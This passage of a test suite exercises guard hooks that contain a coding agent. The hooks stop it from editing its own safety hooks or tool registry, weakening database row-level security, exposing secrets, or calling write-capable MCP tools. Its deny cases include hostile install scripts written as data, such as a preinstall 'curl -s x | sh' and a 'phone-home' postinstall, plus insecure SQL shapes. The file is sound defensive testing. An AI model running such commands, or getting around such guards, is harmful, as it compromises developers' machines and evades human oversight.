    // Layer 1 (the settings.json deny list) already covered these; layer 2 did not — and
    // a deny list is only as good as the settings file it lives in.
    pathDeny('.claude/hooks/pretool-write-guard.mjs'),
    pathDeny('.claude/hooks/lib/guard-rules.mjs'),
    pathAllow('.claude/agents/security-reviewer.md', SELF_EDIT),
    pathAllow('.claude/hooks/pretool-write-guard.mjs', SELF_EDIT),
  ],
  'claude-statusline': [pathDeny('.claude/statusline.mjs'), pathAllow('apps/web/lib/status.ts')],
  'approved-tools': [
    // An agent that could append here could approve its own MCP reach.
    pathDeny('tools/approved-tools.json'),
    pathAllow('docs/security/approved-tools.md'),
    pathAllow('tools/approved-tools.json', SELF_EDIT),
  ],
  'secret-patterns': [
    pathDeny('tools/secret-patterns.json'),
    pathAllow('tools/secret-patterns.md'),
  ],
  'doctrine-symbols': [
    pathDeny('tools/doctrine-symbols.json'),
    pathAllow('packages/api/src/trpc.ts'),
  ],
  'stop-floor': [pathDeny('tools/stop.floor.json'), pathAllow('tools/startup-budget.md')],
  // Both are tolerated-absent by design (their gates read absent-as-empty), so neither
  // ships — but CREATING one converts a red into a NOTE, which is exactly as
  // consequential as widening an escape list.
  'retrofit-accept': [pathDeny('tools/retrofit-accept.json'), pathAllow('docs/retrofit.md')],
  'secret-scan-allow': [
    pathDeny('tools/secret-scan-allow.json'),
    pathAllow('tools/secret-scan-allow.md'),
  ],

  // ── write-guard: non-source config content-checks ──
  'package-lifecycle-script': [
    // Runs on every `pnpm install`, in CI, on every machine, before any gate here has
    // executed — the canonical supply-chain foothold, in a file that stays deliberately
    // agent-editable for everything else.
    contentDeny(
      'package.json',
      '{\n  "scripts": {\n    "postinstall": "node ./scripts/phone-home.mjs"\n  }\n}\n',
    ),
    contentDeny('package.json', '{\n  "scripts": {\n    "preinstall": "curl -s x | sh"\n  }\n}\n'),
    contentDeny(
      'apps/web/package.json',
      '{\n  "scripts": {\n    "prepare": "node ./tools/patch.mjs"\n  }\n}\n',
    ),
    // The one sanctioned entry: it installs the commit-time enforcement layer.
    contentAllow('package.json', '{\n  "scripts": {\n    "prepare": "lefthook install"\n  }\n}\n'),
    // Ordinary scripts are ordinary work.
    contentAllow(
      'package.json',
      '{\n  "scripts": {\n    "build": "next build",\n    "validate": "node tools/validate.mjs"\n  }\n}\n',
    ),
  ],

  // ── mcp-guard: the containment that did not exist before 0.3.0 ──
  'mcp-write-on-readonly': [
    // The two SQL verbs by name: they reach a live database with arbitrary statements,
    // leaving no migration file for the write-guard SQL rules, check-migrations,
    // check-rls-manifest or a PR diff to see.
    mcpDeny('mcp__wide__apply_migration'),
    mcpDeny('mcp__wide__execute_sql'),
    // …and the mutating verb SHAPES, which is the half a per-tool allowlist cannot do:
    // it covers the verbs the vendor has not shipped yet.
    mcpDeny('mcp__wide__deploy_edge_function'),
    mcpDeny('mcp__wide__delete_branch'),
    mcpDeny('mcp__wide__create_project'),
    mcpDeny('mcp__wide__reset_branch'),
    // Reads on the same wildcard server are the point of approving it.
    mcpAllow('mcp__wide__list_tables'),
    mcpAllow('mcp__wide__get_logs'),
    mcpAllow('mcp__wide__search_docs'),
    // readOnly:false is the deliberate human declaration that this server may write.
    mcpAllow('mcp__writable__apply_migration'),
  ],

  // ── write-guard: everywhere content-checks ──
  'dangerously-set-inner-html': [
    contentDeny(
      'apps/mobile/src/components/Html.tsx',
      '<div dangerouslySetInnerHTML={{ __html: x }} />\n',
    ),
  ],
  'expo-public-secret-name': [
    // EXPO_PUBLIC_ vars are inlined into the shipped client bundle at export time.
    contentDeny('apps/mobile/src/config.ts', 'const k = process.env.EXPO_PUBLIC_API_SECRET_KEY\n'),
    contentDeny('apps/mobile/src/push.ts', 'const t = process.env.EXPO_PUBLIC_PUSH_TOKEN\n'),
    // The transport origin legitimately rides the prefix — secret-SHAPED names only.
    contentAllow('apps/mobile/src/config.ts', 'const url = process.env.EXPO_PUBLIC_API_URL\n'),
  ],
  'next-public-secret-name': [
    // NEXT_PUBLIC_ vars are inlined into the shipped WEB bundle at build time.
    contentDeny(
      'apps/web/lib/config.ts',
      'const k = process.env.NEXT_PUBLIC_SUPABASE_SERVICE_KEY\n',
    ),
    contentDeny('apps/web/app/page.tsx', 'const t = process.env.NEXT_PUBLIC_ADMIN_TOKEN\n'),
    // The public config rides the prefix — secret-SHAPED names only. NEXT_PUBLIC_SUPABASE_
    // PUBLISHABLE has no KEY suffix by design, so it must pass.
    contentAllow('apps/web/lib/config.ts', 'const url = process.env.NEXT_PUBLIC_SUPABASE_URL\n'),
    contentAllow(
      'apps/web/lib/config.ts',
      'const pk = process.env.NEXT_PUBLIC_SUPABASE_PUBLISHABLE\n',
    ),
  ],
  'set-config-session-wide': [
    contentDeny(
      'apps/server/src/db/context.ts',
      "await sql`select set_config('app.user_id', ${id}, false)`\n",
    ),
    // A comma inside the value expression must not hide the session-wide 3rd arg.
    contentDeny(
      'apps/server/src/db/context.ts',
      "await sql`select set_config('app.user_id', concat(${a}, ${b}), false)`\n",
    ),
    // /i catches SQL-style FALSE.
    contentDeny(
      'apps/server/src/db/context.ts',
      "await sql`select set_config('app.user_id', ${id}, FALSE)`\n",
    ),
    // A nested "tests"-named product dir is still content-checked (not exempt).
    contentDeny(
      'packages/verticals/notes/src/data/tests/helper.ts',
      "await sql`select set_config('app.user_id', ${id}, false)`\n",
    ),
  ],
  'set-session-app-guc': [
    contentDeny('apps/server/src/db/context.ts', 'await sql`SET SESSION app.user_id = ${id}`\n'),
    contentDeny('apps/server/src/db/context.ts', 'await sql`SET app.user_id = ${id}`\n'),
  ],
  'pg-session-timeout-set': [
    contentDeny(
      'packages/platform/supabase/src/pool.ts',
      "await sql`SET statement_timeout = '30s'`\n",
    ),
    contentDeny('packages/platform/supabase/src/pool.ts', 'await sql`SET SESSION lock_timeout TO 0`\n'),
    contentDeny(
      'supabase/functions/report/index.ts',
      "await client.query(\"SET idle_in_transaction_session_timeout = '10min'\")\n",
    ),
    // The safe spelling: reverted at transaction end, so the pooled backend goes
    // back to the reviewed per-role ceiling before the next tenant gets it.
    contentAllow(
      'packages/platform/supabase/src/pool.ts',
      "await sql`SET LOCAL statement_timeout = '3s'`\n",
    ),
    // The carve-out. `ALTER ROLE x SET ...` writes pg_db_role_setting — it is the
    // mechanism the per-role ceilings are BUILT from, not a session mutation.
    contentAllow(
      'supabase/functions/provision/index.ts',
      "await sql`ALTER ROLE authenticated SET statement_timeout = '8s'`\n",
    ),
    // Path-scoped: a gate script that PRINTS the statement as remediation advice is
    // discussing it, not executing it (check-migrations.mjs's fix message does).
    contentAllow(
      'e2e/support/db-notes.ts',
      "const advice = `add \\`SET lock_timeout = '3s';\\` as the first statement`\n",
    ),
  ],
  'pg-advisory-session-lock': [
    contentDeny('packages/platform/supabase/src/lock.ts', 'await sql`select pg_advisory_lock(${key})`\n'),
    contentDeny(
      'packages/platform/supabase/src/lock.ts',
      'await sql`select pg_advisory_unlock(${key})`\n',
    ),
    contentDeny(
      'packages/platform/supabase/src/lock.ts',
      'await sql`select pg_advisory_lock_shared(${key})`\n',
    ),
    // Released at COMMIT *and* at ROLLBACK — including the error path that leaks the
    // session-scoped one forever.
    contentAllow(
      'packages/platform/supabase/src/lock.ts',
      'await sql`select pg_advisory_xact_lock(${key})`\n',
    ),
  ],
  'pg-prepared-statement': [
    contentDeny('packages/platform/supabase/src/driver.ts', 'const sql = postgres(url, { max: 5 })\n'),
    contentDeny('packages/platform/supabase/src/driver.ts', 'const sql = postgres(url)\n'),
    contentAllow(
      'packages/platform/supabase/src/driver.ts',
      'const sql = postgres(url, { max: 5, prepare: false })\n',
    ),
    // `postgres(?:ql)?://` in a URL-validating regex is not a driver construction —
    // the shipped env validator and the secret scanner both contain exactly this.
    contentAllow(
      'packages/platform/env/src/index.ts',
      'const DB_URL = /^postgres(?:ql)?:\\/\\/\\S+$/\n',
    ),
  ],
  'vitest-workspace-file': [
    contentDeny('vitest.workspace.mts', "import { defineWorkspace } from 'vitest/config'\n"),
  ],

  // ── write-guard: SQL schema + migration surface ──
  // Every case below was ALLOWED before 0.2.0 — not because a rule judged it safe,
  // but because the source-extension gate ended the hook for .sql files before any
  // content rule ran. The paired allow-cases are the load-bearing half: each rule is
  // path-scoped, so the identical bytes under supabase/tests/** must still be
  // writable or the fixtures that prove these shapes get rejected cannot exist.
  'rls-disable-or-noforce': [
    contentDeny(
      'supabase/migrations/20260301000000_oops.sql',
      'ALTER TABLE public.notes DISABLE ROW LEVEL SECURITY;\n',
    ),
    contentDeny(
      'supabase/migrations/20260301000000_oops.sql',
      'ALTER TABLE public.notes NO FORCE ROW LEVEL SECURITY;\n',
    ),
    contentDeny('supabase/schemas/20_notes.sql', 'alter table notes disable row level security;\n'),
    // A test asserting the database rejects this shape must be able to contain it.
    contentAllow(
      'supabase/tests/rls_structure.test.sql',
      "SELECT throws_ok($$ALTER TABLE public.notes DISABLE ROW LEVEL SECURITY$$, '42501');\n",
    ),
    contentAllow(
      'supabase/migrations/20260301000000_fine.sql',
      'ALTER TABLE public.notes ENABLE ROW LEVEL SECURITY;\nALTER TABLE public.notes FORCE ROW LEVEL SECURITY;\n',
    ),
  ],
  'policy-to-public-role': [
    contentDeny(
      'supabase/migrations/20260301000000_oops.sql',
      'CREATE POLICY notes_read ON public.notes FOR SELECT TO public USING (owner_id = (SELECT auth.uid()));\n',
    ),
    contentDeny(
      'supabase/migrations/20260301000000_oops.sql',
      'CREATE POLICY notes_read ON public.notes FOR SELECT TO anon USING (owner_id = (SELECT auth.uid()));\n',
    ),
    contentAllow(
      'supabase/migrations/20260301000000_fine.sql',
      'CREATE POLICY notes_read ON public.notes FOR SELECT TO authenticated USING (owner_id = (SELECT auth.uid()));\n',
    ),
  ],
  'policy-using-true': [
    contentDeny(
      'supabase/migrations/20260301000000_oops.sql',
      'CREATE POLICY notes_read ON public.notes FOR SELECT TO authenticated USING (true);\n',
    ),
    contentDeny(
      'supabase/migrations/20260301000000_oops.sql',
      'CREATE POLICY notes_ins ON public.notes FOR INSERT TO authenticated WITH CHECK ( TRUE );\n',
    ),
    contentAllow(
      'supabase/tests/rls_structure.test.sql',
      "SELECT is_empty($$SELECT 1 FROM pg_policies WHERE qual = 'true'$$, 'no policy USING (true)');\n",
    ),
  ],
  'security-definer-no-search-path': [
    contentDeny(
      'supabase/migrations/20260301000000_oops.sql',
      'CREATE FUNCTION private.f() RETURNS void LANGUAGE sql SECURITY DEFINER AS $$ SELECT 1 $$;\n',
    ),
    // A non-empty search_path is still caller-influenced — only '' is pinned.
    contentDeny(
      'supabase/migrations/20260301000000_oops.sql',
      "CREATE FUNCTION private.f() RETURNS void LANGUAGE sql SECURITY DEFINER SET search_path = public AS $$ SELECT 1 $$;\n",
    ),
    contentAllow(
      'supabase/migrations/20260301000000_fine.sql',
      "CREATE FUNCTION private.f() RETURNS void LANGUAGE sql SECURITY DEFINER SET search_path = '' AS $$ SELECT 1 $$;\n",
    ),
    contentAllow(
      'supabase/migrations/20260301000000_fine.sql',
      "CREATE FUNCTION private.f() RETURNS void LANGUAGE sql STABLE SECURITY INVOKER SET search_path = '' AS $$ SELECT 1 $$;\n",
    ),
  ],
}

for (const [id, cases] of Object.entries(RULE_CANARIES)) {
  cases.forEach((c, i) => {
    test(`rule ${id} [${String(i)}] ${c.expectDeny ? 'denies' : 'allows'} (${c.hook})`, () => {
      const r = runHook(c.hook, c.input, c.env ? { env: c.env } : {})
      assert.equal(denied(r), c.expectDeny, `${id}[${String(i)}]: ${r.stdout} ${r.stderr}`)
    })
  })
}

// `lefthook` and `tsconfig` are the only rule ids that are valid JS identifiers, so their
// RULE_CANARIES keys above render UNQUOTED (biome strips unnecessary key quotes) — and
// scripts/check-canary-coverage.mjs scans the source for a QUOTED id to prove coverage.
// Naming them here as string LITERALS (biome preserves value quotes) keeps that static
// closure honest about the canaries these ids genuinely carry above; the runtime closure
// below asserts every id has an entry regardless of key spelling.
for (const id of ['lefthook', 'tsconfig']) {
  test(`identifier-shaped write-protected rule ${id} carries a canary`, () => {
    assert.ok(RULE_CANARIES[id]?.length, `rule ${id} must have a pathDeny canary`)
  })
}

test('every guard rule id has a behavioral canary (per-rule falsifiability closure)', async () => {
  const {
    BASH_RULES,
    WRITE_PROTECTED,
    WRITE_GLOBAL_CHECKS,
    WRITE_SQL_CHECKS,
    WRITE_CONFIG_CHECKS,
    MCP_RULES,
  } = await import(GUARD_RULES.href)
  const ids = [
    ...BASH_RULES,
    ...WRITE_PROTECTED,
    ...WRITE_GLOBAL_CHECKS,
    ...WRITE_SQL_CHECKS,
    ...WRITE_CONFIG_CHECKS,
    ...MCP_RULES,
  ].map((r) => r.id)
  for (const id of ids) {
    assert.ok(
      RULE_CANARIES[id]?.length,
      `guard rule '${id}' has no RULE_CANARIES entry — add a deny/allow case`,
    )
  }
  // No stale canary: a removed rule must not leave a dangling table entry.
  const idSet = new Set(ids)
  for (const key of Object.keys(RULE_CANARIES)) {
    assert.ok(idSet.has(key), `RULE_CANARIES has '${key}' but no guard rule exports that id`)
  }
})

// ── mcp-guard: the inline denies (no flat rule id, so no RULE_CANARIES entry) ──
// Before 0.3.0 an `mcp__` tool call matched NO PreToolUse hook — the matchers were
// literally "Bash" and "Edit|Write|MultiEdit" — while docs/security/approved-tools.md
// declared default-deny. Every case below is a call that used to reach the database, the
// filesystem or the network with nothing in its path.
const mcp = (tool_name, env) =>
  runHook('pretool-mcp-guard.mjs', { tool_name, tool_input: {} }, { env: env ?? MCP_ENV })

test('mcp-guard: an unregistered server is DENIED, with the exact one-edit remedy', () => {
  const r = mcp('mcp__supabase__list_tables')
  assert.ok(denied(r), r.stdout)
  // Risk stated in the release plan: a deny message that leaves the user guessing teaches
  // HARNESS_ALLOW_SELF_EDIT habits, which is the worst thing a guard can teach. The
  // remedy must arrive with the call's own values already filled in — asserted on the
  // DECODED reason, since the wire form is a JSON string with everything escaped.
  const reason = JSON.parse(r.stdout).hookSpecificOutput.permissionDecisionReason
  assert.match(reason, /not in the approved registry/)
  assert.match(reason, /"server": "supabase"/)
  assert.match(reason, /"tools": \["list_tables"\]/)
  assert.match(reason, /docs\/security\/approved-tools\.md/)
})

test('mcp-guard: a registered server does not admit a tool outside its list', () => {
  // The shipped registry: corpus_search is approved for two read tools and nothing else.
  const ok = runHook('pretool-mcp-guard.mjs', {
    tool_name: 'mcp__corpus_search__corpus_search',
    tool_input: {},
  })
  assert.ok(!denied(ok), ok.stdout)
  const no = runHook('pretool-mcp-guard.mjs', {
    tool_name: 'mcp__corpus_search__execute_sql',
    tool_input: {},
  })
  assert.ok(denied(no), no.stdout)
  assert.match(no.stdout, /is not on its list/)
})

test('mcp-guard FAILS CLOSED with no registry — an absent policy is not an empty policy', () => {
  const bare = mkdtempSync(join(tmpdir(), 'epah-mcp-bare-'))
  const r = mcp('mcp__corpus_search__corpus_search', { CLAUDE_PROJECT_DIR: bare })
  assert.ok(denied(r), r.stdout)
  assert.match(r.stdout, /is missing/)
})

test('mcp-guard FAILS CLOSED on a corrupt or mis-shaped registry (tampering, not config)', () => {
  const corrupt = mkdtempSync(join(tmpdir(), 'epah-mcp-corrupt-'))
  mkdirSync(join(corrupt, 'tools'), { recursive: true })
  writeFileSync(join(corrupt, 'tools/approved-tools.json'), '{ not json')
  const bad = mcp('mcp__corpus_search__corpus_search', { CLAUDE_PROJECT_DIR: corrupt })
  assert.ok(denied(bad), bad.stdout)
  assert.match(bad.stdout, /not valid JSON/)

  const shapeless = mkdtempSync(join(tmpdir(), 'epah-mcp-shape-'))
  mkdirSync(join(shapeless, 'tools'), { recursive: true })
  writeFileSync(join(shapeless, 'tools/approved-tools.json'), '{"servers": "all of them"}')
  const r = mcp('mcp__corpus_search__corpus_search', { CLAUDE_PROJECT_DIR: shapeless })
  assert.ok(denied(r), r.stdout)
  assert.match(r.stdout, /no `servers` array/)
})

test('mcp-guard: a registered server with an EMPTY tools list approves nothing', () => {
  const empty = mkdtempSync(join(tmpdir(), 'epah-mcp-empty-'))
  mkdirSync(join(empty, 'tools'), { recursive: true })
  writeFileSync(
    join(empty, 'tools/approved-tools.json'),
    JSON.stringify({ servers: [{ server: 'half', readOnly: true, tools: [] }] }),
  )
  const r = mcp('mcp__half__anything', { CLAUDE_PROJECT_DIR: empty })
  assert.ok(denied(r), r.stdout)
  assert.match(r.stdout, /lists no tools/)
})

test('mcp-guard: an unparseable tool name is DENIED (a containment that guesses is none)', () => {
  for (const name of ['mcp__', 'mcp__lonely', 'mcp____tool', 'mcp__server__']) {
    const r = mcp(name)
    assert.ok(denied(r), `${name} → ${r.stdout}`)
  }
  // A tool whose own name contains `__` must bind to the FIRST separator, not reparse
  // into a different server.
  const nested = mcp('mcp__wide__get__thing')
  assert.ok(!denied(nested), nested.stdout)
})

test('mcp-guard passes through a non-MCP tool name (it never trusts its own matcher)', () => {
  const r = mcp('Bash')
  assert.equal(r.code, 0)
  assert.ok(!denied(r), r.stdout)
})

test('mcp-guard fails CLOSED on malformed stdin and on unloadable rules', () => {
  const bad = runHook('pretool-mcp-guard.mjs', 'this is { not json')
  assert.equal(bad.code, 2, bad.stderr)

  const broken = mkdtempSync(join(tmpdir(), 'epah-mcp-norules-'))
  cpSync(join(TEMPLATE, '.claude'), join(broken, '.claude'), { recursive: true })
  rmSync(join(broken, '.claude/hooks/lib/guard-rules.mjs'))
  const res = spawnSync('node', [join(broken, '.claude/hooks/pretool-mcp-guard.mjs')], {
    input: JSON.stringify({ tool_name: 'mcp__wide__list_tables', tool_input: {} }),
    encoding: 'utf8',
    env: { ...cleanEnv(), CLAUDE_PROJECT_DIR: broken },
  })
  assert.equal(res.status, 2, 'a guard that cannot read its rules approves nothing')
})

// ── write-guard: allow / no-false-positive contract ───────────────────────────
test('write-guard denies Windows-spelled paths (backslashes must not fail open)', () => {
  // Simulates a native-Windows session: OS-native absolute file_path + backslashed
  // CLAUDE_PROJECT_DIR. The guard normalizes both to POSIX before the PROTECTED
  // match — without that, every root-anchored pattern silently fails open.
  const abs = runHook(
    'pretool-write-guard.mjs',
    { tool_input: { file_path: 'D:\\proj\\tools\\validate.mjs', content: 'x\n' } },
    { env: { CLAUDE_PROJECT_DIR: 'D:\\proj' } },
  )
  assert.ok(denied(abs), 'backslashed absolute path must still be write-protected')
  const rel = runHook('pretool-write-guard.mjs', {
    tool_input: { file_path: 'tools\\harness.config.mjs', content: 'x\n' },
  })
  assert.ok(denied(rel), 'backslashed relative path must still be write-protected')
})

test('write-guard does NOT false-positive on ordinary nested project files', () => {
  for (const f of [
    'apps/mobile/src/features/knip.json',
    'node_modules/pkg/tools/validate.mjs',
    'apps/server/src/lefthook.yml',
    // Contains "ios" in a segment without BEING the generated native dir.
    'apps/mobile/src/ios-utils.ts',
  ]) {
    const r = runHook('pretool-write-guard.mjs', {
      tool_input: { file_path: f, content: 'const x = 1\n' },
    })
    assert.ok(!denied(r), `${f} should not be treated as harness-protected`)
  }
})

// ── bash-guard: allow contract (must NOT deny) ────────────────────────────────
for (const cmd of [
  'pnpm validate',
  'cat .env.example',
  'supabase migration up',
  // The RLS runner's own fail-closed hint tells the agent to do exactly this:
  'node tests/rls/run-rls.mjs',
  'pnpm test:rls',
  'git commit -m "feat: notes"',
  // Reads/derived writes that only LOOK adjacent to the protected surface:
  'node tools/validate.mjs > /tmp/validate.log',
  'cp tools/check-sources.mjs /tmp/inspect.mjs',
  'rm -r build',
  'rm -f stale.log',
  'git config user.email dev@example.com',
  'echo done > /tmp/out.txt',
  'source ./scripts/env.sh',
]) {
  test(`bash-guard passes: ${cmd}`, () => {
    const r = runHook('pretool-bash-guard.mjs', { tool_name: 'Bash', tool_input: { command: cmd } })
    assert.equal(r.code, 0, r.stderr)
    assert.ok(!r.stdout.includes('"deny"'), `${cmd} → ${r.stdout}`)
  })
}

// ── write-guard: migrations append-only ───────────────────────────────────────
test('write-guard denies edits to an EXISTING migration, allows a NEW one', () => {
  const existing = runHook('pretool-write-guard.mjs', {
    tool_input: {
      file_path: 'supabase/migrations/0000_init.sql',
      content: 'ALTER TABLE notes ...\n',
    },
  })
  assert.ok(denied(existing), 'existing migration must be append-only')
  const fresh = runHook('pretool-write-guard.mjs', {
    tool_input: {
      file_path: 'supabase/migrations/0001_add_column.sql',
      content: 'ALTER TABLE notes ADD COLUMN x text;\n',
    },
  })
  assert.ok(!denied(fresh), fresh.stdout)
})

// ── write-guard: path-scoped inline content checks (no flat rule id) ──────────
test('write-guard content-checks app.config.ts weakenings (not blanket protection)', () => {
  const cases = [
    ['export default { android: { usesCleartextTraffic: true } }\n', true, 'cleartext traffic'],
    [
      'export default { ios: { infoPlist: { NSAllowsArbitraryLoads: true } } }\n',
      true,
      'ATS off wholesale',
    ],
    ['export default { newArchEnabled: false }\n', true, 'New Architecture off'],
    ['export default { name: "Renamed App", slug: "renamed-app" }\n', false, 'benign edit'],
  ]
  for (const [content, expectDeny, label] of cases) {
    const r = runHook('pretool-write-guard.mjs', {
      tool_input: { file_path: 'apps/mobile/app.config.ts', content },
    })
    assert.equal(denied(r), expectDeny, `${label}: ${r.stdout}`)
  }
})

test('write-guard content-checks app.json the same way (JSON spelling)', () => {
  const bad = runHook('pretool-write-guard.mjs', {
    tool_input: {
      file_path: 'apps/mobile/app.json',
      content:
        '{"expo":{"ios":{"infoPlist":{"NSAppTransportSecurity":{"NSAllowsArbitraryLoads":true}}}}}\n',
    },
  })
  assert.ok(denied(bad), bad.stdout)
  const good = runHook('pretool-write-guard.mjs', {
    tool_input: {
      file_path: 'apps/mobile/app.json',
      content: '{"expo":{"name":"app","slug":"app"}}\n',
    },
  })
  assert.ok(!denied(good), good.stdout)
})

for (const [label, file, content] of [
  [
    'unguarded WITH RECURSIVE',
    'apps/server/src/queries/graph.ts',
    'const q = sql`WITH RECURSIVE t AS (SELECT 1)`\n',
  ],
  [
    'mobile importing @supabase/ssr (server cookies)',
    'apps/mobile/src/features/notes.ts',
    "import { createServerClient } from '@supabase/ssr'\n",
  ],
  ['mobile importing postgres', 'apps/mobile/src/data/db.ts', "import postgres from 'postgres'\n"],
  ['mobile importing pg', 'apps/mobile/src/api/client.ts', "import { Client } from 'pg'\n"],
  ['mobile importing pino', 'apps/mobile/src/log.ts', "import pino from 'pino'\n"],
  [
    'expo-secure-store outside the host seam',
    'apps/mobile/src/features/auth.ts',
    "import * as SecureStore from 'expo-secure-store'\n",
  ],
  // Web surface: the service-role factory never in the web process; server-side getSession banned.
  [
    'service-role factory in apps/web',
    'apps/web/app/actions/admin.ts',
    "import { createServiceRoleClient_BYPASSES_RLS } from '@app/supabase'\n",
  ],
  [
    'SUPABASE_SERVICE_ROLE_KEY in apps/web',
    'apps/web/lib/db.ts',
    'const k = process.env.SUPABASE_SERVICE_ROLE_KEY\n',
  ],
  [
    'getSession server-side in apps/web',
    'apps/web/lib/auth.ts',
    'export async function who() { return await supabase.auth.getSession() }\n',
  ],
]) {
  test(`write-guard denies (inline check): ${label}`, () => {
    const r = runHook('pretool-write-guard.mjs', { tool_input: { file_path: file, content } })
    assert.ok(denied(r), `${label}: ${r.stdout}`)
  })
}

for (const [label, file, content] of [
  [
    'transaction-local GUC',
    'apps/server/src/db/context.ts',
    "await sql`select set_config('app.user_id', ${id}, true)`\n",
  ],
  [
    'guarded WITH RECURSIVE',
    'apps/server/src/queries/graph.ts',
    'const q = sql`WITH RECURSIVE t AS (SELECT 1) CYCLE id SET is_cycle USING path`\n',
  ],
  [
    'expo-secure-store inside src/host (the one-door seam)',
    'apps/mobile/src/host/secure-store.ts',
    "import * as SecureStore from 'expo-secure-store'\n",
  ],
  [
    'web importing @supabase/ssr (the ban is mobile-only)',
    'apps/web/lib/supabase/server.ts',
    "import { createServerClient } from '@supabase/ssr'\n",
  ],
  // Web surface: getUser is the CORRECT server-side call; getSession is fine inside a 'use client' component.
  [
    'getUser server-side in apps/web',
    'apps/web/lib/auth.ts',
    'export async function who() { return await supabase.auth.getUser() }\n',
  ],
  [
    "getSession inside a 'use client' web component",
    'apps/web/components/SessionBadge.tsx',
    "'use client'\nexport function B() { return supabase.auth.getSession() }\n",
  ],
]) {
  test(`write-guard passes: ${label}`, () => {
    const r = runHook('pretool-write-guard.mjs', { tool_input: { file_path: file, content } })
    assert.ok(!denied(r), `${label}: ${r.stdout}`)
  })
}

test('write-guard exempts test bodies from content checks', () => {
  // Root test trees, the mobile __tests__ tree, and colocated *.test.* files
  // legitimately reference banned patterns (the RLS suite asserts on
  // set_config false behavior). A nested product dir named "tests" stays
  // checked — covered by the set-config-session-wide canary above.
  for (const f of [
    'tests/rls/probe.test.ts',
    'test/unit/context.ts',
    'e2e/a11y.spec.ts',
    'packages/verticals/notes/src/data/notes.test.ts',
    'apps/mobile/__tests__/setup.tsx',
  ]) {
    const r = runHook('pretool-write-guard.mjs', {
      tool_input: {
        file_path: f,
        content: "await sql`select set_config('app.user_id', ${id}, false)`\n",
      },
    })
    assert.ok(!denied(r), `${f}: ${r.stdout}`)
  }
})

// ── source-check ──────────────────────────────────────────────────────────────
test('source-check blocks uncited decision sites, passes cited ones (ts + sql)', () => {
  const uncitedTs = join(proj, 'apps/server/src/auth-x.ts')
  mkdirSync(join(proj, 'apps/server/src'), { recursive: true })
  writeFileSync(uncitedTs, 'const claims = await jwtVerify(token, jwks)\n')
  assert.equal(
    runHook('posttool-source-check.mjs', { tool_input: { file_path: uncitedTs } }).code,
    2,
  )

  const citedTs = join(proj, 'apps/server/src/auth-y.ts')
  writeFileSync(
    citedTs,
    '// SOURCE: entra docs [corpus: entra/jwt-verify]\nconst claims = await jwtVerify(token, jwks)\n',
  )
  assert.equal(runHook('posttool-source-check.mjs', { tool_input: { file_path: citedTs } }).code, 0)

  const uncitedSql = join(proj, 'supabase/migrations/9999_x.sql')
  writeFileSync(uncitedSql, 'ALTER TABLE notes FORCE ROW LEVEL SECURITY;\n')
  assert.equal(
    runHook('posttool-source-check.mjs', { tool_input: { file_path: uncitedSql } }).code,
    2,
  )

  const citedSql = join(proj, 'supabase/migrations/9998_y.sql')
  writeFileSync(
    citedSql,
    '-- SOURCE: postgres docs [corpus: postgres/rls-force]\nALTER TABLE notes FORCE ROW LEVEL SECURITY;\n',
  )
  assert.equal(
    runHook('posttool-source-check.mjs', { tool_input: { file_path: citedSql } }).code,
    0,
  )
})

test('source-check skips json, tests, and machine-generated adapters', () => {
  // The design-tokens adapter (src/generated/*) and the Supabase type mirror
  // (database.types.ts) are machine-written and regen-diffed, never cited.
  for (const f of [
    'x.config.json',
    'apps/web/lib/auth.test.ts',
    'packages/design-tokens/src/generated/native.ts',
    'packages/platform/supabase/src/database.types.ts',
  ]) {
    const p = join(proj, f)
    mkdirSync(join(proj, f.split('/').slice(0, -1).join('/') || '.'), { recursive: true })
    writeFileSync(p, 'jwtVerify(token)\n')
    assert.equal(runHook('posttool-source-check.mjs', { tool_input: { file_path: p } }).code, 0, f)
  }
})

// ── stop-validate-gate ────────────────────────────────────────────────────────
// Portable pass/fail steps (the hook-contracts CI lane also runs on Windows,
// where `true`/`false` are not commands).
const PASS = 'node -e "process.exit(0)"'
const FAIL = 'node -e "process.exit(1)"'

test('stop gate: green steps exit 0, red steps exit 2, loop guard passes', () => {
  writeFileSync(
    join(proj, 'tools/harness.config.mjs'),
    `export const VALIDATE_STEPS = []\nexport const STOP_HOOK_STEPS = [['ok', '${PASS}']]\n`,
  )
  const green = runHook('stop-validate-gate.mjs', { stop_hook_active: false })
  assert.equal(green.code, 0, green.stderr)

  writeFileSync(
    join(proj, 'tools/harness.config.mjs'),
    `export const VALIDATE_STEPS = []\nexport const STOP_HOOK_STEPS = [['ok', '${PASS}'], ['boom', '${FAIL}']]\n`,
  )
  const red = runHook('stop-validate-gate.mjs', { stop_hook_active: false })
  assert.equal(red.code, 2, 'red gate must block the turn')
  assert.ok(red.stderr.includes('GREEN GATE'), red.stderr)

  // While red, the gate keeps blocking even on continuation turns — the loop
  // is bounded by the runtime's CLAUDE_CODE_STOP_HOOK_BLOCK_CAP, not by the
  // hook going soft. Only the message changes.
  const looped = runHook('stop-validate-gate.mjs', { stop_hook_active: true })
  assert.equal(looped.code, 2, 'gate must stay red on continuation while failures remain')
  assert.ok(looped.stderr.includes('STILL red'), looped.stderr)

  writeFileSync(
    join(proj, 'tools/harness.config.mjs'),
    `export const VALIDATE_STEPS = []\nexport const STOP_HOOK_STEPS = [['ok', '${PASS}']]\n`,
  )
  const greenLoop = runHook('stop-validate-gate.mjs', { stop_hook_active: true })
  assert.equal(greenLoop.code, 0, 'green gate releases the turn even mid-loop')
})

test('stop gate: steps run under HARNESS_STOP_GATE=1 (fail-closed runners can tell)', () => {
  writeFileSync(
    join(proj, 'tools/harness.config.mjs'),
    `export const VALIDATE_STEPS = []\nexport const STOP_HOOK_STEPS = [['probe', 'node -e "process.exit(process.env.HARNESS_STOP_GATE === \\'1\\' ? 0 : 1)"']]\n`,
  )
  const r = runHook('stop-validate-gate.mjs', { stop_hook_active: false })
  assert.equal(r.code, 0, `HARNESS_STOP_GATE must be set for gate steps: ${r.stderr}`)
})

test('stop gate: a BROKEN config blocks the turn even when the fallback chain would pass', () => {
  writeFileSync(join(proj, 'tools/harness.config.mjs'), 'this is not { valid js\n')
  const r = runHook('stop-validate-gate.mjs', { stop_hook_active: false })
  assert.equal(r.code, 2, 'mangled gate config must block the turn')
  assert.ok(r.stderr.includes('gate-config BROKEN'), r.stderr)
  assert.ok(
    !r.stderr.includes('pnpm validate FAILED'),
    'fallback must be direct invocation, not script indirection',
  )
})

test('stop gate: green output surfaces SKIPPED layers instead of staying silent', () => {
  writeFileSync(
    join(proj, 'tools/harness.config.mjs'),
